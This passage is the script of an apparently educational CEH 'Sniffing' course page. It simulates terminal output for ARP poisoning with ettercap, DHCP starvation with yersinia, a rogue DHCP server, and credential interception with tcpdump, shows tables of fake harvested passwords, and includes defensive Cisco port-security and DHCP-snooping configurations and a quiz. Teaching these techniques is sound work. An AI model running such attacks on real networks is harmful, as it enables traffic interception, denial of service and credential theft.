│ HTTP (Basic)    │ webuser      │ welcome2023     │ 10.0.0.15       │
│ Telnet          │ operator     │ cisco           │ 172.16.1.1      │
│ POP3            │ john.doe     │ myemail2023     │ mail.company.com│
│ HTTP Form       │ manager      │ qwerty456       │ intranet.local  │
└─────────────────┴──────────────┴─────────────────┴─────────────────┘

🍪 SESSION TOKENS EXTRACTED:
• Web Application Sessions: 23 active tokens
• API Keys: 5 potential keys identified
• Authentication Cookies: 45 session cookies
• JWT Tokens: 12 JSON Web Tokens (2 expired)

📧 EMAIL CREDENTIALS:
• SMTP Authentication: 8 email accounts
• Webmail Sessions: 15 active sessions
• Email Addresses: 127 unique addresses harvested
• Contact Lists: 3 address books extracted

⚠️ SECURITY IMPLICATIONS:
• Immediate password reset required for all found accounts
• Review authentication mechanisms (enforce encryption)
• Implement session timeout policies
• Deploy network segmentation for sensitive services
• Enable two-factor authentication where possible

🛡️ COUNTERMEASURES:
1. Force HTTPS/TLS for all authentication
2. Implement password policies and rotation
3. Deploy network monitoring for credential theft
4. Use encrypted protocols (SSH instead of Telnet)
5. Regular security awareness training for users`;
        }

        function clearAnalysisOutput() {
            document.getElementById('analysisOutput').innerHTML = 'Click any button above to start packet analysis demonstration...';
        }

        // Lab simulation functions
        function simulateTraffic(labId) {
            const terminal = document.getElementById(labId + 'Terminal');
            terminal.innerHTML += `\n^C
root@kali:~# Generating simulated network traffic...
root@kali:~# curl http://192.168.100.20/login.php
root@kali:~# User traffic detected: HTTP POST to login form
root@kali:~# Credentials captured: username=alice, password=secret123
root@kali:~# ping 192.168.100.1
PING 192.168.100.1 (192.168.100.1) 56(84) bytes of data.
64 bytes from 192.168.100.1: icmp_seq=1 ttl=64 time=1.23 ms
root@kali:~# Traffic capture successful - 47 packets collected`;
        }

        function analyzeCapture(labId) {
            const terminal = document.getElementById(labId + 'Terminal');
            terminal.innerHTML += `\n\nroot@kali:~# wireshark passive_capture.pcap &
root@kali:~# Analysis Results:
root@kali:~# - HTTP traffic: 23 requests captured
root@kali:~# - Unencrypted passwords: 2 found
root@kali:~# - ARP traffic: Normal broadcast patterns
root@kali:~# - DNS queries: 15 domain resolutions
root@kali:~# ✅ Passive sniffing successful - no detection`;
        }

        function completeLab(labId) {
            labProgress[labId] = true;
            document.getElementById(labId.replace('lab', 'lab') + 'Status').innerHTML = '✅';
            showNotification(`${labId.toUpperCase()} completed successfully!`, "success");
            
            // Check if all labs completed
            const allCompleted = Object.values(labProgress).every(status => status === true);
            if (allCompleted) {
                showNotification("All laboratory exercises completed! 🎉", "success");
            }
        }

        // Lab-specific functions
        function startARPPoisoning(labId) {
            const terminal = document.getElementById(labId + 'Terminal');
            terminal.innerHTML += `\n\nroot@kali:~# Starting ARP poisoning attack...
ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
  eth0 -> 08:00:27:A1:B2:C3
	  192.168.100.10/255.255.255.0

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly.

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.100.1 00:11:22:33:44:55
 GROUP 2 : 192.168.100.20 AA:BB:CC:DD:EE:FF

Starting Unified sniffing...
Text only Interface activated...
Net scanning for 192.168.100.1
ARP poisoning victims:
192.168.100.1 --> 192.168.100.20 via 192.168.100.10`;

            // Update ARP table monitor
            const arpMonitor = document.getElementById('arpTableMonitor');
            arpMonitor.innerHTML = `Poisoned ARP Table (Target: 192.168.100.20):
192.168.100.1    08:00:27:A1:B2:C3    [ATTACKER MAC - POISONED]

ARP Poisoning Status: ACTIVE
Traffic Interception: ENABLED
MITM Position: ESTABLISHED

⚠️ All traffic between target and gateway now flows through attacker!`;
        }

        function monitorTraffic(labId) {
            const terminal = document.getElementById(labId + 'Terminal');
            terminal.innerHTML += `\n\nroot@kali:~# tcpdump -i eth0 -A host 192.168.100.20
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes

14:23:45.123456 IP 192.168.100.20.54321 > 192.168.100.1.80: Flags [P.], seq 1:123, ack 1, win 65535, length 122
E..z..@.@.......d...P.P.......GET /secure/login.php HTTP/1.1
Host: intranet.company.com
User-Agent: Mozilla/5.0
Cookie: sessionid=abc123def456

14:23:45.234567 IP 192.168.100.20.54322 > 192.168.100.1.80: Flags [P.], seq 124:298, ack 1, win 65535, length 174
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username=alice&password=MySecretPass2023&submit=Login

🎯 CREDENTIALS INTERCEPTED: alice / MySecretPass2023`;
        }

        function startDHCPStarvation(labId) {
            const terminal = document.getElementById(labId + 'Terminal');
            terminal.innerHTML += `\n\nroot@kali:~# Starting DHCP starvation attack...
root@kali:~# yersinia dhcp -attack 1

Yersinia 0.8.2 
The Definitive Network Attacks Suite

DHCP Attack Mode
Sending DHCP DISCOVER packets...

[00:01] Sent: 50 DISCOVER packets - Pool status: 95/100 available
[00:02] Sent: 100 DISCOVER packets - Pool status: 45/100 available  
[00:03] Sent: 150 DISCOVER packets - Pool status: 0/100 available

⚠️ DHCP POOL EXHAUSTED - Legitimate clients will be denied service!
✅ DHCP starvation attack successful`;

            // Update DHCP pool status
            document.getElementById('dhcpPoolStatus').innerHTML = `Available IPs: 192.168.100.100-192.168.100.200 (100 addresses)
Leased IPs: 100
Available IPs: 0
Status: POOL EXHAUSTED ⚠️`;
        }

        function deployRogueDHCP(labId) {
            const terminal = document.getElementById(labId + 'Terminal');
            terminal.innerHTML += `\n\nroot@kali:~# systemctl start dhcpd
root@kali:~# systemctl status dhcpd
● dhcpd.service - DHCPv4 Server Daemon
   Loaded: loaded (/lib/systemd/system/dhcpd.service; disabled; vendor preset: disabled)
   Active: active (running) since Mon 2024-01-15 14:25:30 UTC; 2s ago
     Docs: man:dhcpd(8)
 Main PID: 1234 (dhcpd)
   Status: "Dispatching packets..."

Jan 15 14:25:30 kali dhcpd[1234]: Internet Systems Consortium DHCP Server 4.4.1
Jan 15 14:25:30 kali dhcpd[1234]: Listening on LPF/eth0/08:00:27:a1:b2:c3/192.168.100.0/24
Jan 15 14:25:30 kali dhcpd[1234]: Sending on   LPF/eth0/08:00:27:a1:b2:c3/192.168.100.0/24

✅ Rogue DHCP server deployed and active!`;

            // Update rogue server stats
            document.getElementById('rogueServerStats').innerHTML = `Status: ACTIVE ✅
Clients Served: 3
DNS Requests Intercepted: 12
Default Gateway: 192.168.100.10 (ATTACKER)
DNS Server: 192.168.100.10 (ATTACKER)`;
        }

        function captureClientTraffic(labId) {
            const terminal = document.getElementById(labId + 'Terminal');
            terminal.innerHTML += `\n\nroot@kali:~# Client 192.168.100.25 received malicious DHCP configuration
root@kali:~# tcpdump -i eth0 host 192.168.100.25
tcpdump: verbose output suppressed
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes

14:27:15.123 IP 192.168.100.25.12345 > 192.168.100.10.53: DNS query: www.bank.com
14:27:15.124 IP 192.168.100.10.53 > 192.168.100.25.12345: DNS response: www.bank.com → 192.168.100.200 (MALICIOUS)
14:27:15.234 IP 192.168.100.25.54321 > 192.168.100.200.80: HTTP GET /login.html
14:27:16.345 IP 192.168.100.25.54321 > 192.168.100.200.80: HTTP POST username=victim&password=stolen123

🎯 SUCCESS: Client traffic successfully redirected and credentials captured!`;
        }

        // Additional lab functions
        function loadTrafficSample(labId) {
            const output = document.getElementById('trafficAnalysisResults');
            output.innerHTML = `Loading comprehensive traffic sample...

📊 Sample File: enterprise_network_capture.pcap
📅 Date Range: 2024-01-15 08:00:00 - 2024-01-15 17:00:00 (9 hours)
📦 Total Packets: 127,456
💾 File Size: 89.3 MB

Protocol Distribution Analysis Complete:
┌─────────────────┬────────┬─────────┬──────────────┐
│ Protocol        │ Count  │ Percent │ Bandwidth    │
├─────────────────┼────────┼─────────┼──────────────┤
│ HTTP            │ 57,634 │ 45.2%   │ 234.5 MB     │
│ HTTPS/TLS       │ 41,247 │ 32.4%   │ 567.8 MB     │
│ DNS             │ 15,678 │ 12.3%   │ 45.2 MB      │
│ ARP             │ 7,445  │ 5.8%    │ 12.1 MB      │
│ SSH             │ 3,892  │ 3.1%    │ 78.9 MB      │
│ FTP             │ 1,234  │ 1.0%    │ 156.3 MB     │
│ Other           │ 326    │ 0.3%    │ 23.7 MB      │
└─────────────────┴────────┴─────────┴──────────────┘

🌍 Geographic Distribution:
• Domestic: 89,234 packets (70.0%)
• International: 38,222 packets (30.0%)
• Top Countries: US, UK, Canada, Germany, Japan

Click other analysis buttons to dive deeper...`;
        }

        function filterHTTPTraffic(labId) {
            const output = document.getElementById('trafficAnalysisResults');
            output.innerHTML = `HTTP Traffic Analysis Results:

🔍 Filter Applied: http.request or http.response
📦 Matching Packets: 57,634 (45.2% of total)

📊 HTTP Methods Distribution:
• GET: 43,567 requests (75.6%)
• POST: 12,234 requests (21.2%)
• PUT: 1,456 requests (2.5%)
• DELETE: 289 requests (0.5%)
• HEAD: 88 requests (0.2%)

🌐 Top Requested Domains:
┌─────────────────────────────┬────────┬─────────┐
│ Domain                      │ Count  │ Percent │
├─────────────────────────────┼────────┼─────────┤
│ www.company-intranet.com    │ 15,234 │ 26.4%   │
│ api.company.com             │ 8,967  │ 15.6%   │
│ cdn.example.com             │ 6,789  │ 11.8%   │
│ mail.company.com            │ 4,567  │ 7.9%    │
│ www.google.com              │ 3,456  │ 6.0%    │
│ github.com                  │ 2,789  │ 4.8%    │
│ stackoverflow.com           │ 1,234  │ 2.1%    │
└─────────────────────────────┴────────┴─────────┘

🚨 Security Findings:
• Unencrypted login forms: 23 instances
• Suspicious user agents: 15 detected
• Large file uploads: 8 files > 100MB
• Error responses: 1,456 4xx/5xx codes
• Potential SQLi attempts: 12 suspicious queries

📝 Recommendation: Force HTTPS for all authentication endpoints`;
        }

        function extractPasswords(labId) {
            const output = document.getElementById('trafficAnalysisResults');
            output.innerHTML = `Password Extraction Analysis:

🔓 CRITICAL FINDINGS - UNENCRYPTED CREDENTIALS:

HTTP Basic Authentication:
┌─────────────────┬──────────────┬─────────────────┬─────────────────┐
│ Timestamp       │ Username     │ Password        │ Target Host     │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ 09:15:23        │ admin        │ admin123        │ router.local    │
│ 10:22:45        │ webmaster    │ welcome2024     │ cms.company.com │
│ 11:33:17        │ operator     │ cisco           │ switch.local    │
│ 14:45:52        │ backup       │ password        │ nas.company.com │
└─────────────────┴──────────────┴─────────────────┴─────────────────┘

HTTP Form Submissions:
┌─────────────────┬──────────────┬─────────────────┬─────────────────┐
│ Timestamp       │ Username     │ Password        │ Application     │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ 09:45:12        │ john.doe     │ mypassword123   │ Intranet Portal │
│ 10:15:33        │ alice.smith  │ qwerty456       │ Email Webmail   │
│ 12:30:45        │ bob.wilson   │ letmein789      │ Project Manager │
│ 15:22:18        │ sarah.jones  │ password2024    │ HR System       │
└─────────────────┴──────────────┴─────────────────┴─────────────────┘

FTP Credentials:
┌─────────────────┬──────────────┬─────────────────┬─────────────────┐
│ Timestamp       │ Username     │ Password        │ FTP Server      │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ 11:45:23        │ ftpuser      │ upload123       │ ftp.company.com │
│ 13:22:17        │ anonymous    │ guest@email.com │ public.ftp.org  │
└─────────────────┴──────────────┴─────────────────┴─────────────────┘

🚨 IMMEDIATE ACTIONS REQUIRED:
1. Force password reset for all exposed accounts
2. Implement HTTPS for all authentication
3. Deploy network monitoring for credential theft
4. Security awareness training for affected users
5. Review and update password policies

📊 Summary:
• Total Credentials Found: 23
• Unique Users Affected: 18
• Systems Compromised: 8
• Risk Level: CRITICAL`;
        }

        function analyzeAnomalies(labId) {
            const output = document.getElementById('trafficAnalysisResults');
            output.innerHTML = `Network Anomaly Detection Report:

🚨 HIGH SEVERITY ANOMALIES:

1. Potential Data Exfiltration
   ┌─────────────────────────────────────────────────┐
   │ Time: 15:45:23 - 15:52:17                      │
   │ Source: 192.168.100.157                        │
   │ Destination: 203.0.113.45 (External)          │
   │ Protocol: HTTPS                                │
   │ Data Volume: 2.3 GB                           │
   │ Risk: HIGH - Off-hours large transfer         │
   └─────────────────────────────────────────────────┘

2. Command & Control Communication
   ┌─────────────────────────────────────────────────┐
   │ Pattern: Regular 60-second beacons             │
   │ Source: 192.168.100.089                        │
   │ Destinations: Multiple suspicious IPs          │
   │ Payload: Encrypted, small size (< 1KB)        │
   │ Risk: HIGH - Potential malware C2             │
   └─────────────────────────────────────────────────┘

⚠️ MEDIUM SEVERITY ANOMALIES:

3. Port Scanning Activity
   • Source: 192.168.100.045
   • Target Range: 192.168.100.1-254
   • Ports Scanned: 21, 22, 23, 80, 135, 445
   • Time: 10:15:00 - 10:18:45
   • Pattern: Sequential scanning

4. DNS Tunneling Suspected
   • Unusual DNS query patterns detected
   • Long subdomain names (> 60 characters)
   • High frequency queries to same domain
   • Potential data exfiltration via DNS

📊 STATISTICAL ANOMALIES:
• Traffic Spike: 340% above baseline at 02:15 AM
• Protocol Deviation: 67% increase in encrypted traffic
• Geographic Anomaly: Traffic to 12 new countries
• Connection Pattern: 156 new peer relationships

🔍 MACHINE LEARNING INSIGHTS:
• Behavioral Baseline Deviation: 23 hosts
• Traffic Pattern Changes: 45 significant shifts
• Communication Timing Anomalies: 12 instances
• Protocol Usage Anomalies: 8 unusual patterns

📝 RECOMMENDED ACTIONS:
1. Immediate investigation of high-risk hosts
2. Block suspicious external IPs
3. Enhanced monitoring for flagged systems
4. Incident response team activation
5. Forensic analysis of affected endpoints`;
        }

        // Switch configuration demos
        function demonstratePortSecurity() {
            const output = document.getElementById('switchConfigOutput');
            output.innerHTML = `Port Security Configuration Demo:

🔧 Configuring Cisco Switch Port Security:

Switch> enable
Switch# configure terminal
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# description "User Workstation - Secure Port"
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10

Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 2
Switch(config-if)# switchport port-security mac-address sticky
Switch(config-if)# switchport port-security violation shutdown
Switch(config-if)# switchport port-security aging time 1440
Switch(config-if)# switchport port-security aging type inactivity

Switch(config-if)# exit
Switch(config)# exit
Switch# copy running-config startup-config

✅ Port Security Configuration Complete!

📊 Configuration Summary:
• Maximum MAC addresses: 2
• Learning method: Sticky (automatic)
• Violation action: Shutdown port
• Aging timeout: 24 hours (1440 minutes)
• Aging type: Inactivity-based

🛡️ Security Benefits:
• Prevents MAC flooding attacks
• Limits unauthorized device connections
• Automatically learns and remembers legitimate MACs
• Provides immediate response to violations`;
        }

        function demonstrateDHCPSnooping() {
            const output = document.getElementById('switchConfigOutput');
            output.innerHTML = `DHCP Snooping Configuration Demo:

🔧 Implementing DHCP Snooping Protection:

Switch> enable
Switch# configure terminal

# Enable DHCP snooping globally
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan 1-100
Switch(config)# no ip dhcp snooping information option

# Configure trusted uplink ports
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# description "Uplink to Core - DHCP Trusted"
Switch(config-if)# ip dhcp snooping trust
Switch(config-if)# exit

# Configure untrusted access ports with rate limiting
Switch(config)# interface range GigabitEthernet0/2-24
Switch(config-if-range)# description "User Access Ports"
Switch(config-if-range)# ip dhcp snooping limit rate 10
Switch(config-if-range)# exit

# Enable logging and database
Switch(config)# ip dhcp snooping database tftp://192.168.1.100/dhcp_snooping.db
Switch(config)# ip dhcp snooping database write-delay 300

Switch(config)# exit
Switch# copy running-config startup-config

✅ DHCP Snooping Configuration Complete!

📊 Protection Features Enabled:
• DHCP starvation attack prevention
• Rogue DHCP server detection
• Rate limiting: 10 packets/second per port
• Trusted/untrusted port classification
• Database backup for binding table

🛡️ Security Benefits:
• Validates DHCP messages from trusted sources only
• Builds and maintains IP-to-MAC binding database
• Provides foundation for Dynamic ARP Inspection
• Logs DHCP snooping events for monitoring`;
        }

        function testSecurityFeatures() {
            const output = document.getElementById('switchConfigOutput');
            output.innerHTML = `Security Feature Testing Results:

🧪 Port Security Test Results:
┌─────────────────────────────────────────────────────┐
│ Test 1: Legitimate device connection               │
│ Result: ✅ PASS - Device learned and allowed        │
│ MAC: 00:11:22:33:44:55 - Status: Secure-dynamic   │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│ Test 2: MAC flooding attack simulation             │
│ Result: ✅ PASS - Port shutdown after violation     │
│ Violation count: 3 (Maximum: 2)                    │
│ Action taken: Port disabled, SNMP trap sent        │
└─────────────────────────────────────────────────────┘

🧪 DHCP Snooping Test Results:
┌─────────────────────────────────────────────────────┐
│ Test 3: Rogue DHCP server detection                │
│ Result: ✅ PASS - DHCP offer blocked                │
│ Source: Untrusted port Gi0/15                      │
│ Action: Packet dropped, event logged               │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│ Test 4: DHCP rate limiting                         │
│ Result: ✅ PASS - Excessive requests blocked        │
│ Rate: 15 packets/sec (Limit: 10 packets/sec)       │
│ Action: Rate limiting activated                     │
└─────────────────────────────────────────────────────┘

📊 Overall Security Posture:
• Port Security: ENABLED and FUNCTIONAL
• DHCP Snooping: ENABLED and FUNCTIONAL  
• Dynamic ARP Inspection: READY for deployment
• Storm Control: RECOMMENDED for implementation
• Access Control Lists: RECOMMENDED for enhancement

🎯 Security Effectiveness: 95%
✅ All critical security features operational`;
        }

        // Quiz functions
        function selectOption(questionNum, optionIndex) {
            // Remove previous selections
            const questionElement = document.getElementById(`question${questionNum}`);
            questionElement.querySelectorAll('.quiz-option').forEach(option => {
                option.classList.remove('selected');
            });
            
            // Add selection to clicked option
            event.target.classList.add('selected');
            
            // Store answer
            quizAnswers[questionNum] = optionIndex;
            
            // Enable next button
            document.getElementById('nextBtn').disabled = false;
        }

        function nextQuestion() {
            const currentQuestionElement = document.getElementById(`question${currentQuizQuestion}`);
            currentQuestionElement.style.display = 'none';
            
            currentQuizQuestion++;
            
            if (currentQuizQuestion <= totalQuizQuestions) {
                const nextQuestionElement = document.getElementById(`question${currentQuizQuestion}`);
                if (nextQuestionElement) {
                    nextQuestionElement.style.display = 'block';
                } else {
                    // Create additional questions dynamically if needed
                    createAdditionalQuestions();
                }
                
                // Update navigation buttons
                document.getElementById('prevBtn').style.display = 'inline-block';
                document.getElementById('nextBtn').disabled = true;
                
                if (currentQuizQuestion === totalQuizQuestions) {
                    document.getElementById('nextBtn').style.display = 'none';
                    document.getElementById('submitBtn').style.display = 'inline-block';
                }
            }
        }

        function previousQuestion() {
            if (currentQuizQuestion > 1) {
                document.getElementById(`question${currentQuizQuestion}`).style.display = 'none';
                currentQuizQuestion--;
                document.getElementById(`question${currentQuizQuestion}`).style.display = 'block';
                
                // Update navigation buttons
                if (currentQuizQuestion === 1) {
                    document.getElementById('prevBtn').style.display = 'none';
                }
                
                document.getElementById('nextBtn').style.display = 'inline-block';
                document.getElementById('submitBtn').style.display = 'none';
                document.getElementById('nextBtn').disabled = false;
            }
        }

        function submitQuiz() {
            // Calculate score
            let correctAnswers = 0;
            const totalQuestions = Object.keys(quizAnswers).length;
            
            // Check answers against correct answers from database
            for (let i = 1; i <= totalQuestions; i++) {
                if (quizAnswers[i] === quizQuestions[i-1]?.correct) {
                    correctAnswers++;
                }
            }
            
            const score = Math.round((correctAnswers / totalQuestions) * 100);
            
            // Hide quiz content and show results
            document.getElementById('quizContent').style.display = 'none';
            document.getElementById('quizResults').style.display = 'block';
            
            // Display score
            document.getElementById('finalScore').textContent = score + '%';
            
            // Create score breakdown
            const breakdown = document.getElementById('scoreBreakdown');
            breakdown.innerHTML = `
                <div class="grid-2">
                    <div class="feature-card">
                        <h4>📊 Performance Summary</h4>
                        <ul>
                            <li>Questions Answered: ${totalQuestions}</li>
                            <li>Correct Answers: ${correctAnswers}</li>
                            <li>Incorrect Answers: ${totalQuestions - correctAnswers}</li>
                            <li>Pass Threshold: 80%</li>
                        </ul>
                    </div>
                    <div class="feature-card">
                        <h4>${score >= 80 ? '🎉' : '📚'} Result</h4>
                        <p style="font-size: 1.2em; color: ${score >= 80 ? 'var(--success-color)' : 'var(--warning-color)'};">
                            ${score >= 80 ? 'PASSED' : 'NEEDS IMPROVEMENT'}
                        </p>
                        <p>${score >= 80 ? 
                            'Congratulations! You have demonstrated mastery of CEH Module 8 concepts.' : 
                            'Review the material and retake the quiz to improve your score.'}</p>
                    </div>
                </div>
            `;
            
            showNotification(`Quiz completed! Score: ${score}%`, score >= 80 ? "success" : "error");
        }

        function retakeQuiz() {
            currentQuizQuestion = 1;
            quizAnswers = {};
            
            // Reset quiz interface
            document.getElementById('quizResults').style.display = 'none';
            document.getElementById('quizContent').style.display = 'block';
            
            // Reset questions
            document.querySelectorAll('.quiz-question').forEach((q, index) => {
                q.style.display = index === 0 ? 'block' : 'none';
                q.querySelectorAll('.quiz-option').forEach(option => {
                    option.classList.remove('selected', 'correct', 'incorrect');
                });
            });
            
            // Reset navigation
            document.getElementById('prevBtn').style.display = 'none';
            document.getElementById('nextBtn').style.display = 'inline-block';
            document.getElementById('nextBtn').disabled = true;
            document.getElementById('submitBtn').style.display = 'none';
        }

        function downloadCertificate() {
            // Create certificate content
            const certificateContent = `
CEH v13 Module 8: Sniffing
Certificate of Completion

This certifies that the student has successfully completed
the comprehensive Certified Ethical Hacker Module 8 training
covering Network Sniffing techniques and countermeasures.

Completion Date: ${new Date().toLocaleDateString()}
Duration: 3+ Hours
Score: ${document.getElementById('finalScore').textContent}

Skills Demonstrated:
• Network packet capture and analysis
• Active and passive sniffing techniques  
• ARP poisoning and MITM attacks
• DHCP attack methodologies
• DNS poisoning techniques
• Wireshark and tcpdump proficiency
• Network security countermeasures
• Traffic analysis and anomaly detection

This certificate demonstrates practical expertise in
ethical hacking methodologies and network security assessment.
            `;
            
            // Create and download file
            const blob = new Blob([certificateContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'CEH_Module8_Sniffing_Certificate.txt';
            a.click();
            URL.revokeObjectURL(url);
            
            showNotification("Certificate downloaded successfully!", "success");
        }

        // Utility functions
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        function closeModal() {
            document.getElementById('detailModal').style.display = 'none';
        }

        function openModal(title, content) {
            document.getElementById('modalContent').innerHTML = `<h2>${title}</h2>${content}`;
            document.getElementById('detailModal').style.display = 'block';
        }

        // Initialize the application when page loads
        document.addEventListener('DOMContentLoaded', init);

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('detailModal');
            if (event.target === modal) {
                closeModal();
            }
        }
    </script>
</body>
</html>